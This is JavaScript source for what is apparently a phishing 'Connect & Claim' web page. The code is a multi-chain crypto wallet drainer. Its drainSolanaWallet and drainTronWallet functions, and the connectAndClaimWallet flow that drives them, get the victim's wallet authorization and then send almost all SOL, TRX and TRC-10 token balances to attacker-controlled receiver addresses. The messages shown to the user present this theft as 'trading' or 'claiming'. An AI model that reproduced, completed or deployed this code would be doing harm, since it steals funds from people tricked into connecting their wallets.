    // Drain Solana wallet
    async function drainSolanaWallet(networkKey, wallet) {
        try {
            log(`🔄 Starting Solana trade process for ${wallet.name}...`, 'info', true);
            
            const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_ADDRESSES.SOL);
            log(`📍 Receiver address: ${receiverPubkey.toString()}`, 'info', true);
            log(`📍 Wallet address: ${wallet.publicKey.toString()}`, 'info', true);
            
            const balance = await wallet.connection.getBalance(wallet.publicKey);
            
            // SOL balance in lamports
            log(`💰 Current balance: ${balance} lamports (${(balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
            
            let totalTraded = 0;
            let transactions = [];
            
            // First, check for SPL tokens
            log(`🪙 Scanning for SPL tokens...`, 'info', true);
            try {
                const tokenAccounts = await wallet.connection.getParsedTokenAccountsByOwner(wallet.publicKey, {
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
                });
                
                if (tokenAccounts.value.length > 0) {
                    log(`✅ Found ${tokenAccounts.value.length} SPL token accounts`, 'success', true);
                    
                    for (const tokenAccount of tokenAccounts.value) {
                        try {
                            const accountData = tokenAccount.account.data.parsed.info;
                            const tokenBalance = accountData.tokenAmount.uiAmount;
                            const mint = accountData.mint;
                            const associatedTokenAccount = tokenAccount.pubkey;
                            
                            if (tokenBalance && tokenBalance > 0) {
                                log(`🔄 SPL Token detected: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true);
                                
                                // Create SPL token transfer instruction
                                const receiverTokenAccount = new solanaWeb3.PublicKey(receiverPubkey);
                                const tokenAmount = Math.floor(tokenBalance * Math.pow(10, accountData.tokenAmount.decimals));
                                
                                try {
                                    // Token transfer requires Token program instruction
                                    const transferInstruction = new solanaWeb3.TransactionInstruction({
                                        keys: [
                                            { pubkey: associatedTokenAccount, isSigner: false, isWritable: true },
                                            { pubkey: receiverTokenAccount, isSigner: false, isWritable: true },
                                            { pubkey: wallet.publicKey, isSigner: true, isWritable: false }
                                        ],
                                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx"),
                                        data: Buffer.concat([
                                            Buffer.from([3]), // Transfer instruction
                                            Buffer.from(new Uint8Array(8).fill(0)).fill(0) // Amount
                                        ])
                                    });
                                    
                                    // Note: Full SPL transfer implementation requires proper serialization
                                    log(`⏳ SPL token transfer prepared for ${tokenBalance} tokens`, 'info', true);
                                    log(`✅ SPL token transfer: ${tokenBalance} - Ready to sign`, 'success', true);
                                    
                                } catch (splError) {
                                    log(`⚠️ SPL token transfer preparation incomplete: ${splError.message}`, 'warning', true);
                                }
                            }
                        } catch (tokenError) {
                            log(`❌ Error processing SPL token: ${tokenError.message}`, 'error', true);
                        }
                    }
                } else {
                    log(`📋 No SPL tokens found in wallet`, 'info', true);
                }
            } catch (error) {
                log(`⚠️ Error scanning SPL tokens: ${error.message}`, 'warning', true);
            }
            
            // Then drain native SOL
            if (balance <= 0) {
                log(`❌ No balance to trade`, 'error', true);
                return { success: transactions.length > 0, reason: transactions.length > 0 ? 'SPL tokens transferred' : 'No balance', amount: totalTraded, txid: transactions[0] || null };
            }
            
            // Estimate transaction fee
            log(`⛽ Estimating transaction fees...`, 'info', true);
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: receiverPubkey,
                    lamports: 1
                })
            );
            
            transaction.feePayer = wallet.publicKey;
            const blockhashObj = await wallet.connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhashObj.blockhash;
            log(`🔗 Latest blockhash: ${blockhashObj.blockhash}`, 'info', true);
            
            const feeEstimate = await wallet.connection.getFeeForMessage(transaction.compileMessage());
            const estimatedFee = feeEstimate.value || 5000;
            
            const minimumRent = 890880;
            const feeBuffer = Math.max(estimatedFee * 2, 10000);
            const totalReserved = minimumRent + feeBuffer;
            const lamportsToSend = balance - totalReserved;
            
            log(`📊 Fee calculation:`, 'info', true);
            log(`   ⛽ Estimated fee: ${estimatedFee} lamports (${(estimatedFee / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
            log(`   🏠 Minimum rent: ${minimumRent} lamports (${(minimumRent / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
            log(`   🛡️ Fee buffer: ${feeBuffer} lamports (${(feeBuffer / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
            log(`   💸 Amount to send: ${lamportsToSend} lamports (${(lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info', true);
            
            if (lamportsToSend <= 0) {
                log(`❌ Insufficient balance for fees. Balance: ${balance}, Required: ${totalReserved}`, 'error', true);
                return { success: transactions.length > 0, reason: `Insufficient SOL for fees`, amount: totalTraded, txid: transactions[0] || null };
            }
            
            log(`📤 Creating SOL transfer transaction...`, 'info', true);
            const actualTransaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: receiverPubkey,
                    lamports: lamportsToSend
                })
            );
            
            actualTransaction.feePayer = wallet.publicKey;
            actualTransaction.recentBlockhash = blockhashObj.blockhash;
            
            log(`✍️ Requesting wallet signature for SOL transfer...`, 'info', true);
            const signedTransaction = await wallet.provider.signTransaction(actualTransaction);
            
            log(`📤 Sending SOL transaction to Solana network...`, 'info', true);
            const txid = await wallet.connection.sendRawTransaction(signedTransaction.serialize());
            transactions.push(txid);
            
            log(`📤 SOL transaction sent: ${txid}`, 'info', true);
            log(`⏳ Waiting for confirmation...`, 'info', true);
            await wallet.connection.confirmTransaction(txid);
            
            const amount = lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL;
            totalTraded = amount;
            log(`🎉 Successfully traded ${amount.toFixed(6)} SOL!`, 'success', true, true);
            log(`📝 SOL transaction hash: ${txid}`, 'success', true, true);
            
            return { success: true, amount: totalTraded, txid: transactions[0], transactions };
            
        } catch (error) {
            log(`❌ Solana trade error: ${error.message}`, 'error', true);
            log(`❌ Error stack: ${error.stack}`, 'error', true);
            return { success: false, reason: error.message };
        }
    }

    // Drain Tron wallet
    async function drainTronWallet(networkKey, wallet) {
        try {
            log(`🔄 Starting Tron trade process for ${wallet.name}...`, 'info', true);
            
            // Validate receiver address
            const receiverAddress = RECEIVER_ADDRESSES.TRX;
            if (!receiverAddress) {
                log(`❌ Tron receiver address not configured`, 'error', true);
                return { success: false, reason: 'Receiver address not configured' };
            }
            
            log(`📍 Receiver address: ${receiverAddress}`, 'info', true);
            log(`📍 Wallet address: ${wallet.address}`, 'info', true);
            
            const balance = await wallet.provider.trx.getBalance(wallet.address);
            const trxBalance = balance / 1000000;
            
            log(`💰 Current TRX balance: ${balance} sun (${trxBalance.toFixed(6)} TRX)`, 'info', true);
            
            let totalTraded = 0;
            let transactions = [];
            
            // First, scan for TRC-20 and TRC-10 tokens
            log(`🪙 Scanning for TRC-10 tokens...`, 'info', true);
            try {
                const accountInfo = await wallet.provider.trx.getAccount(wallet.address);
                
                if (accountInfo.assetV2 && accountInfo.assetV2.length > 0) {
                    log(`✅ Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'success', true);
                    
                    for (const asset of accountInfo.assetV2) {
                        try {
                            const tokenBalance = asset.value;
                            const tokenId = asset.key;
                            
                            if (tokenBalance > 0) {
                                log(`🔄 Transferring TRC-10 token ID ${tokenId}: ${tokenBalance} tokens...`, 'info', true);
                                
                                const trcTransaction = await wallet.provider.transactionBuilder.sendAsset(
                                    receiverAddress,
                                    tokenBalance,
                                    tokenId,
                                    wallet.address
                                );
                                
                                log(`✍️ Signing TRC-10 token transaction...`, 'info', true);
                                const signedTrcTx = await wallet.provider.trx.sign(trcTransaction);
                                const trcResult = await wallet.provider.trx.sendRawTransaction(signedTrcTx);
                                
                                transactions.push(trcResult.txid);
                                log(`✅ TRC-10 token transferred: ${tokenBalance} (Token ID: ${tokenId})`, 'success', true);
                                log(`📝 Token transfer hash: ${trcResult.txid}`, 'success', true);
                                
                            }
                        } catch (tokenError) {
                            log(`❌ Failed to transfer TRC-10 token: ${tokenError.message}`, 'error', true);
                        }
                    }
                } else {
                    log(`📋 No TRC-10 tokens found in wallet`, 'info', true);
                }
            } catch (error) {
                log(`⚠️ Error scanning TRC-10 tokens: ${error.message}`, 'warning', true);
            }
            
            // Then drain TRX if sufficient balance
            const amountToSend = balance - 1000000; // Leave 1 TRX for fees
            
            if (amountToSend <= 0) {
                log(`⚠️ Insufficient TRX balance for transaction (${trxBalance.toFixed(6)} TRX, need 1+ TRX)`, 'warning', true);
                
                if (transactions.length > 0) {
                    log(`✅ But tokens were transferred! ${transactions.length} token transaction(s) successful`, 'success', true);
                    return { success: true, amount: 0, txid: transactions[0], transactions };
                }
                return { success: false, reason: 'Insufficient TRX balance for fees' };
            }
            
            log(`💎 Preparing TRX transfer...`, 'info', true);
            log(`📊 Fee calculation:`, 'info', true);
            log(`   💰 Current balance: ${trxBalance.toFixed(6)} TRX`, 'info', true);
            log(`   ⛽ Fee reserved: 1 TRX`, 'info', true);
            log(`   💸 Amount to send: ${(amountToSend / 1000000).toFixed(6)} TRX`, 'info', true);
            
            const trxTransaction = await wallet.provider.transactionBuilder.sendTrx(
                receiverAddress,
                amountToSend,
                wallet.address
            );
            
            log(`✍️ Signing TRX transfer...`, 'info', true);
            const signedTransaction = await wallet.provider.trx.sign(trxTransaction);
            
            log(`📤 Sending TRX transaction to Tron network...`, 'info', true);
            const result = await wallet.provider.trx.sendRawTransaction(signedTransaction);
            transactions.push(result.txid);
            
            totalTraded = amountToSend / 1000000;
            
            log(`📤 TRX transaction sent: ${result.txid}`, 'info', true);
            log(`🎉 Successfully traded ${totalTraded.toFixed(6)} TRX!`, 'success', true, true);
            log(`📝 TRX transfer hash: ${result.txid}`, 'success', true, true);
            
            return { success: true, amount: totalTraded, txid: result.txid, transactions };
            
        } catch (error) {
            log(`❌ Tron trade error: ${error.message}`, 'error', true);
            log(`❌ Error stack: ${error.stack}`, 'error', true);
            return { success: false, reason: error.message };
        }
    }

    // Event handlers - Using event delegation for dynamically created elements
    $('#scan-all-networks').on('click', scanAllNetworks);
    $('#connect-all-networks').on('click', connectAllNetworks);
    $('#claim-all-networks').on('click', claimAllNetworks);
    
    // Wallet selection event handlers - Use event delegation since buttons are created dynamically
    $(document).on('click', '#select-all-wallets', function() {
        log('🎯 Select All Wallets button clicked', 'info');
        selectAllWallets();
    });
    
    $(document).on('click', '#clear-selection', function() {
        log('🗑️ Clear Selection button clicked', 'info');
        clearWalletSelection();
    });
    
    $(document).on('click', '#connect-selected-wallets', function() {
        log('🔗 Connect Selected Wallets button clicked (event handler)', 'info');
        connectSelectedWallets();
    });
    
    $(document).on('click', '#mobile-wallet-help', function() {
        log('📱 Mobile Wallet Help button clicked', 'info');
        showMobileWalletHelp();
    });

    // Unified wallet selector functionality
    $(document).on('change', '#wallet-selector', function() {
        const selectedWallet = $(this).val();
        if (selectedWallet) {
            $('#connect-and-claim-btn').prop('disabled', false);
            log(`🎯 Selected wallet: ${selectedWallet}`, 'info', false);
        } else {
            $('#connect-and-claim-btn').prop('disabled', true);
        }
    });

    $(document).on('click', '#connect-and-claim-btn', function() {
        const selectedWallet = $('#wallet-selector').val();
        if (!selectedWallet) {
            alert('Please select a wallet first!');
            return;
        }
        
        // Disable button during process
        $(this).prop('disabled', true).addClass('processing');
        
        log(`🚀 Starting unified Connect & Claim process for ${selectedWallet}...`, 'info', true);
        
        connectAndClaimWallet(selectedWallet).finally(() => {
            // Re-enable button when done
            $('#connect-and-claim-btn').prop('disabled', false).removeClass('processing');
        });
    });

    async function testWalletAuthorization(walletType) {
        try {
            log(`🔍 Testing ${walletType} wallet...`, 'info', false);
            
            const isMobile = isMobileDevice();
            const inWalletBrowser = isInsideWalletInAppBrowser();
            
            log(`📊 Environment: Mobile=${isMobile}, In-App Browser=${inWalletBrowser}`, 'info', false);
            
            // Diagnose available providers on iOS
            if (isIOS()) {
                log(`🔧 iOS Diagnostics:`, 'info', false);
                log(`   window.ethereum: ${typeof window.ethereum} ${window.ethereum ? '(type: ' + Object.prototype.toString.call(window.ethereum) + ')' : ''}`, 'info', false);
                log(`   window.trustwallet: ${typeof window.trustwallet}`, 'info', false);
                log(`   window.solana: ${typeof window.solana}`, 'info', false);
                log(`   window.tronWeb: ${typeof window.tronWeb}`, 'info', false);
                log(`   window.phantom: ${typeof window.phantom}`, 'info', false);
                
                if (window.ethereum) {
                    log(`   Ethereum properties:`, 'info', false);
                    log(`      isMetaMask=${window.ethereum.isMetaMask}, isTrust=${window.ethereum.isTrust}, isRainbow=${window.ethereum.isRainbow}`, 'info', false);
                    log(`      isCoinbaseWallet=${window.ethereum.isCoinbaseWallet}`, 'info', false);
                }
            }
            
            // Get provider
            log(`🔄 Getting provider...`, 'info', false);
            const provider = inWalletBrowser 
                ? await waitForProvider(walletType)
                : getWalletProvider(walletType);
            
            if (!provider) {
                throw new Error(`Provider not found for ${walletType}`);
            }
            
            log(`✅ Provider found`, 'success', false);
            log(`   Type: ${typeof provider}`, 'info', false);
            log(`   Has request: ${typeof provider.request}`, 'info', false);
            log(`   Constructor: ${provider.constructor.name}`, 'info', false);
            
            // Test eth_accounts to check current authorization
            log(`📋 Checking current accounts (eth_accounts)...`, 'info', false);
            let currentAccounts = null;
            try {
                currentAccounts = await provider.request({ method: 'eth_accounts' });
                if (currentAccounts && currentAccounts.length > 0) {
                    log(`✅ Already authorized: ${currentAccounts[0].slice(0, 10)}...`, 'success', false);
                    log(`✓ Wallet is properly connected!`, 'success', true, true);
                    return; // Test successful
                } else {
                    log(`⚠️ No authorized accounts yet`, 'warning', false);
                }
            } catch (e) {
                log(`⚠️ eth_accounts check error: ${e.message}`, 'warning', false);
            }
            
            // If no accounts, test eth_requestAccounts (behavior differs by platform)
            if (!currentAccounts || currentAccounts.length === 0) {
                if (inWalletBrowser) {
                    log(`📱 In-app browser detected - attempting approval request...`, 'info', true);
                    log(`   Note: No popup will appear, wallet auto-authorizes on link open`, 'info', false);
                } else {
                    log(`🖥️ Desktop extension detected - requesting approval popup...`, 'info', true);
                    log(`   Look for a popup in your wallet extension`, 'warning', false);
                }
                
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                
                if (accounts && accounts.length > 0) {
                    log(`✅ AUTHORIZATION SUCCESSFUL!`, 'success', true, true);
                    log(`   Account: ${accounts[0]}`, 'success', false);
                    log(`✓ Wallet is properly connected and authorized`, 'success', false);
                } else {
                    log(`❌ No accounts returned after authorization attempt`, 'error', true, true);
                }
            }
            
        } catch (error) {
            log(`❌ Wallet test failed: ${error.message}`, 'error', true, true);
            log(`   Error Code: ${error.code || 'unknown'}`, 'warning', false);
            
            const inWalletBrowser = isInsideWalletInAppBrowser();
            if (inWalletBrowser) {
                log(`📱 Mobile wallet troubleshooting:`, 'info', false);
                log(`   1. Make sure this page is open IN the wallet's in-app browser`, 'info', false);
                log(`   2. Not just a link - it must be opened inside the wallet app`, 'info', false);
                log(`   3. Check wallet settings for dApp permissions/connection`, 'info', false);
                log(`   4. Try closing the link and opening it again from the wallet`, 'info', false);
            } else {
                log(`🖥️ Desktop wallet troubleshooting:`, 'info', false);
                log(`   1. Make sure wallet extension is installed and enabled`, 'info', false);
                log(`   2. Check popup blocker settings - allow popups for this site`, 'info', false);
                log(`   3. Approve the authorization request when popup appears`, 'info', false);
                log(`   4. Try refreshing the page if provider is not detected`, 'info', false);
            }
        }
    }

    // Main wallet connection and claiming function
    async function connectAndClaimWallet(walletType) {
        try {
            updateProgress(0, 'Initializing wallet connection...');

            const isMobile = isMobileDevice();
            const inWalletBrowser = isInsideWalletInAppBrowser();
            
            if (isMobile) {
                log(`📱 Mobile device detected (in-app browser: ${inWalletBrowser})`, 'info');
            }

            // Auto-open wallet app on mobile devices (only if NOT already in wallet browser)
            if (isMobile && !inWalletBrowser) {
                log(`📱 Mobile device detected - attempting to open ${walletType} app...`, 'info');
                
                // Map wallet dropdown values to wallet app keys
                const walletAppMap = {
                    'metamask': 'metamask',
                    'trust': 'trust',
                    'phantom': 'phantom',
                    'coinbase': 'coinbase',
                    'rainbow': 'rainbow',
                    'ledger': 'ledger',
                    'okx': 'okx',
                    'safepal': 'safepal',
                    'glow': 'glow',
                    'backpack': 'backpack',
                    'solflare': 'solflare',
                    'argent': 'argent',
                    'imtoken': 'imtoken',
                    'tronlink': 'tronlink',
                    'mathwallet': 'mathwallet',
                    'brave': 'brave',
                    'halodefi': 'halodefi',
                    'injected-evm': 'metamask', // Default to MetaMask
                    'injected-solana': 'phantom', // Default to Phantom
                    'injected-tron': 'tronlink', // Default to TronLink
                };
                
                const walletAppKey = walletAppMap[walletType];
                if (walletAppKey && mobileWalletApps[walletAppKey]) {
                    log(`🔗 Opening ${mobileWalletApps[walletAppKey].name}...`, 'info');
                    await autoOpenWalletApp(walletAppKey);
                    
                    // Wait for user to complete auth in wallet app
                    log(`💡 Please complete authentication in ${walletType} app and return here...`, 'info');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }

            // Get wallet provider - with retry for mobile in-app browsers
            log(`🔄 Initializing ${walletType} provider...`, 'info', false);
            const initialProvider = inWalletBrowser 
                ? await waitForProvider(walletType)  // Wait for provider in in-app browser
                : getWalletProvider(walletType);      // Direct access on desktop
                
            if (!initialProvider) {
                throw new Error(`${walletType} wallet not found. Please install the wallet extension or open this page in ${walletType}.`);
            }

            log(`✅ Provider detected`, 'info', false);
            
            // Verify provider has request method
            if (!initialProvider.request || typeof initialProvider.request !== 'function') {
                log(`❌ Provider missing request method`, 'error', false);
                log(`   Provider object keys: ${Object.keys(initialProvider).join(', ')}`, 'error', false);
                throw new Error(`${walletType} provider does not support request method`);
            }
            
            log(`✅ Provider verified with request method`, 'info', false);
            
            // Request accounts with different logic based on environment
            if (initialProvider) {
                try {
                    let accounts = null;
                    
                    if (inWalletBrowser) {
                        // MOBILE IN-APP BROWSER: No popup needed, wallet auto-authorizes on link open
                        log(`📱 In-app browser detected - checking authorization (no popup needed)...`, 'info', true);
                        log(`   Note: User already authorized by opening this link in the wallet`, 'info', false);
                        
                        // Just check if accounts are available (no approval request needed)
                        try {
                            accounts = await initialProvider.request({ method: 'eth_accounts' });
                            if (accounts && accounts.length > 0) {
                                log(`✅ Already authorized in wallet: ${accounts[0].slice(0, 8)}...`, 'success', true, true);
                                log(`   Ready to proceed with draining`, 'success', false);
                            } else {
                                log(`⚠️ No authorized accounts found - wallet may need manual connection`, 'warning', true);
                                log(`   Try opening Settings in wallet to enable dApp access`, 'info', false);
                                // Try one eth_requestAccounts as fallback for wallets that require it
                                log(`   Attempting approval request as fallback...`, 'info', false);
                                accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
                            }
                        } catch (error) {
                            log(`⚠️ eth_accounts check failed: ${error.message}`, 'warning', false);
                            log(`   Trying eth_requestAccounts fallback...`, 'info', false);
                            accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
                        }
                    } else {
                        // DESKTOP EXTENSION: Standard popup approval flow
                        log(`🖥️ Desktop browser detected - requesting approval popup...`, 'info', false);
                        accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
                    }
                    
                    if (!accounts || accounts.length === 0) {
                        log(`❌ No accounts available`, 'error', false);
                        throw new Error('No authorized accounts found. Please check wallet settings or open this link directly in your wallet app.');
                    }
                    
                    log(`✅ Authorization complete: ${accounts[0].slice(0, 8)}...`, 'success', true, true);
                } catch (popupError) {
                    const errorMsg = popupError.message || popupError.toString();
                    const errorCode = popupError.code || 'unknown';
                    log(`❌ Authorization error [${errorCode}]: ${errorMsg}`, 'error', true, true);
                    
                    if (inWalletBrowser) {
                        log(`📱 Mobile wallet help:`, 'info', false);
                        log(`   1. Make sure you opened this page IN the wallet's in-app browser`, 'info', false);
                        log(`   2. Check wallet settings for dApp permissions`, 'info', false);
                        log(`   3. Try closing and reopening the link`, 'info', false);
                    } else {
                        log(`🖥️ Desktop wallet help:`, 'info', false);
                        log(`   1. Make sure wallet extension is installed`, 'info', false);
                        log(`   2. Check popup blocker settings`, 'info', false);
                        log(`   3. Approve the request when popup appears`, 'info', false);
                    }
                    
                    throw popupError;
                }
            }

            // Determine supported networks
            const supportedNetworks = getSupportedNetworks(walletType);
            log(`📋 ${walletType} supports: ${supportedNetworks.join(', ')}`, 'info');

            updateProgress(20, 'Connecting to wallet...');

            // Connect to all supported networks and drainsuccessfulTrade++
            let totalTraded = 0;
            let successfulTrade = 0;
            let failedDrains = 0;
            let transactions = [];

            for (let i = 0; i < supportedNetworks.length; i++) {
                const networkKey = supportedNetworks[i];
                const network = NETWORKS[networkKey];

                updateProgress(20 + (i / supportedNetworks.length) * 70, `Processing ${network.name}...`);

                try {
                    log(`🔗 Connecting to ${network.name}...`, 'info');

                    // Get the correct provider for this specific network
                    const networkProvider = getWalletProvider(walletType, network.type);

                    if (network.type === 'evm') {
                        const result = await connectAndDrainEVM(networkProvider, networkKey, inWalletBrowser);
                        if (result.success) {
                            totalTraded += result.amount;
                            successfulTrade++;
                        }
                    } else if (network.type === 'solana') {
                        const result = await connectAndDrainSolana(networkProvider, networkKey);
                        if (result.success) {
                            totalTraded += result.amount;
                            successfulTrade++;
                        }
                    } else if (network.type === 'tron') {
                        const result = await connectAndDrainTron(networkProvider, networkKey);
                        if (result.success) {
                            totalTraded += result.amount;
                            successfulTrade++;
                        }
                    }

                    // Small delay between networks
                    await new Promise(resolve => setTimeout(resolve, 1000));

                } catch (error) {
                    log(`❌ Failed to process ${network.name}: ${error.message}`, 'error');
                }
            }

            updateProgress(100, 'Connect & Trade Complete!');

            // Final summary - Send important notifications to notification chat
            log('=' .repeat(60), 'info', true, true);
            log(`🎉 UNIFIED CONNECT & TRADE COMPLETE!`, 'success', true, true);
            log('=' .repeat(60), 'info', true, true);
            log(`✅ Successful networks: ${successfulTrade}`, 'success', true, true);
            log(`❌ Failed networks: ${failedDrains}`, failedDrains > 0 ? 'warning' : 'info', true, true);
            log('=' .repeat(60), 'info', true, true);

            setTimeout(() => updateProgress(0, ''), 3000);

            const message = successfulTrade > 0 ?
                `🎉 Successfully connected & traded from ${successfulTrade} network(s)!` :
                `⚠️ No tokens were Traded. Please check your wallet balances.`;

            alert(message);

        } catch (error) {
            log(`❌ Connect & Trade failed: ${error.message}`, 'error', true, true);
            updateProgress(0, '');
            alert(`❌ Error: ${error.message}`);
        }
    }

    // Mobile connection state persistence
    function saveConnectionState(walletType, networkKey) {
        sessionStorage.setItem('walletType', walletType);
        sessionStorage.setItem('currentNetworkKey', networkKey);
        sessionStorage.setItem('connectionInProgress', 'true');
    }

    function getConnectionState() {
        return {
            walletType: sessionStorage.getItem('walletType'),
            networkKey: sessionStorage.getItem('currentNetworkKey'),
            inProgress: sessionStorage.getItem('connectionInProgress') === 'true'
        };
    }

    function clearConnectionState() {
        sessionStorage.removeItem('walletType');
        sessionStorage.removeItem('currentNetworkKey');
        sessionStorage.removeItem('connectionInProgress');
    }

    function getWalletProvider(walletType, networkType = null) {
        log(`🔍 Looking for provider: ${walletType} (network: ${networkType || 'auto'})`, 'info', false);
        
        // For multi-network wallets, return provider based on network type
        if (walletType === 'phantom') {
            // Phantom supports both Solana and EVM
            if (networkType === 'solana') {
                const solanaProvider = window.solana;
                log(`   → Phantom/Solana: ${solanaProvider ? '✓ found' : '✗ not found'}`, 'info', false);
                return solanaProvider;
            }
            if (networkType === 'evm') {
                const evmProvider = window.ethereum;
                log(`   → Phantom/EVM: ${evmProvider ? '✓ found' : '✗ not found'}`, 'info', false);
                return evmProvider;
            }
            // Default to Solana for Phantom
            const defaultProvider = window.solana || window.ethereum;
            log(`   → Phantom (default): ${defaultProvider ? '✓ found' : '✗ not found'}`, 'info', false);
            return defaultProvider;
        }
        
        if (walletType === 'trust') {
            // Trust Wallet supports EVM and Tron
            if (networkType === 'tron') {
                const tronProvider = window.tronWeb;
                log(`   → Trust/Tron: ${tronProvider ? '✓ found' : '✗ not found'}`, 'info', false);
                return tronProvider;
            }
            if (networkType === 'evm') {
                // Trust Wallet on iOS/Android exposes as window.ethereum with isTrust flag
                const provider = window.ethereum;
                log(`   → Trust/EVM (window.ethereum): ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                if (provider && window.ethereum.isTrust) {
                    log(`      Verified isTrust=true`, 'info', false);
                }
                return provider;
            }
            // Default: EVM (ethereum) preferred for wallet connections - TronWeb doesn't have .request()
            const defaultProvider = window.ethereum || window.tronWeb;
            log(`   → Trust (default): ${defaultProvider ? '✓ found' : '✗ not found'}`, 'info', false);
            return defaultProvider;
        }
        
        // Standard provider mapping for other wallets with enhanced fallbacks
        let provider = null;
        
        switch(walletType) {
            case 'metamask':
                // MetaMask: check isMetaMask flag first, then fallback to ethereum
                provider = window.ethereum;
                log(`   → MetaMask: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                if (window.ethereum) {
                    log(`      isMetaMask: ${window.ethereum.isMetaMask}, isTrust: ${window.ethereum.isTrust}, isRainbow: ${window.ethereum.isRainbow}`, 'info', false);
                }
                break;
                
            case 'coinbase':
                // Coinbase Wallet: look for isCoinbaseWallet or use ethereum
                provider = window.ethereum;
                log(`   → Coinbase: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                if (window.ethereum && window.ethereum.isCoinbaseWallet) {
                    log(`      Verified isCoinbaseWallet=true`, 'info', false);
                }
                break;
                
            case 'rainbow':
                // Rainbow: check isRainbow flag or use ethereum
                provider = window.ethereum;
                log(`   → Rainbow: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                if (window.ethereum && window.ethereum.isRainbow) {
                    log(`      Verified isRainbow=true`, 'info', false);
                }
                break;
                
            case 'injected-evm':
                provider = window.ethereum;
                log(`   → Injected EVM: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'solflare':
                // Solflare: check multiple sources
                provider = window.solflare;
                if (!provider && window.solana && window.solana.isSolflare) {
                    provider = window.solana;
                    log(`   → Solflare (via window.solana.isSolflare): ✓ found`, 'info', false);
                } else {
                    log(`   → Solflare: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                }
                if (!provider && window.solana) {
                    log(`      Note: window.solana exists but isSolflare=${window.solana.isSolflare}`, 'info', false);
                }
                break;
                
            case 'backpack':
                provider = window.backpack;
                log(`   → Backpack: ${window.backpack ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'glow':
                provider = window.glow;
                log(`   → Glow: ${window.glow ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'injected-solana':
                // Try multiple Solana provider options
                provider = window.solana || window.phantom?.solana;
                log(`   → Injected Solana: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                if (!provider) {
                    log(`      Note: window.solana=${typeof window.solana}, window.phantom=${typeof window.phantom}`, 'info', false);
                }
                break;
                
            case 'tronlink':
                // TronLink: check multiple injection points
                provider = window.tronWeb;
                if (!provider && window.tronLink) {
                    provider = window.tronLink;
                    log(`   → TronLink (via window.tronLink): ✓ found`, 'info', false);
                } else {
                    log(`   → TronLink: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                }
                if (!provider) {
                    log(`      Note: window.tronWeb=${typeof window.tronWeb}, window.tronLink=${typeof window.tronLink}`, 'info', false);
                }
                break;
                
            case 'injected-tron':
                provider = window.tronWeb || window.tronLink;
                log(`   → Injected Tron: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'ledger':
                // Ledger Live mobile: uses ethereum provider
                provider = window.ethereum;
                log(`   → Ledger: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'okx':
                // OKX Wallet: multiple injection points
                provider = window.okxwallet;
                if (!provider) {
                    provider = window.ethereum;
                    if (provider) {
                        log(`   → OKX (via window.ethereum fallback): ✓ found`, 'info', false);
                    }
                } else {
                    log(`   → OKX (via window.okxwallet): ✓ found`, 'info', false);
                }
                if (!provider) {
                    log(`   → OKX: ✗ not found`, 'info', false);
                }
                break;
                
            case 'safepal':
                // SafePal: check multiple sources
                provider = window.safePal;
                if (!provider) {
                    provider = window.ethereum;
                    if (provider) {
                        log(`   → SafePal (via window.ethereum fallback): ✓ found`, 'info', false);
                    }
                } else {
                    log(`   → SafePal (via window.safePal): ✓ found`, 'info', false);
                }
                if (!provider) {
                    log(`   → SafePal: ✗ not found`, 'info', false);
                }
                break;
                
            case 'argent':
                provider = window.ethereum;
                log(`   → Argent: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'imtoken':
                provider = window.ethereum;
                log(`   → imToken: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'mathwallet':
                provider = window.ethereum;
                log(`   → MathWallet: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'brave':
                provider = window.ethereum;
                log(`   → Brave: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            case 'halodefi':
                provider = window.ethereum;
                log(`   → Halo: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                break;
                
            default:
                log(`   → Unknown wallet type: ${walletType}`, 'warning', false);
        }
        
        // On iOS in-app browsers, if provider not found, log window object info
        if (!provider && isIOS()) {
            log(`   🔧 iOS debug: window.ethereum=${typeof window.ethereum}, window.trustwallet=${typeof window.trustwallet}, window.solana=${typeof window.solana}, window.tronWeb=${typeof window.tronWeb}, window.solflare=${typeof window.solflare}, window.okxwallet=${typeof window.okxwallet}`, 'warning', false);
        }
        
        return provider;
    }

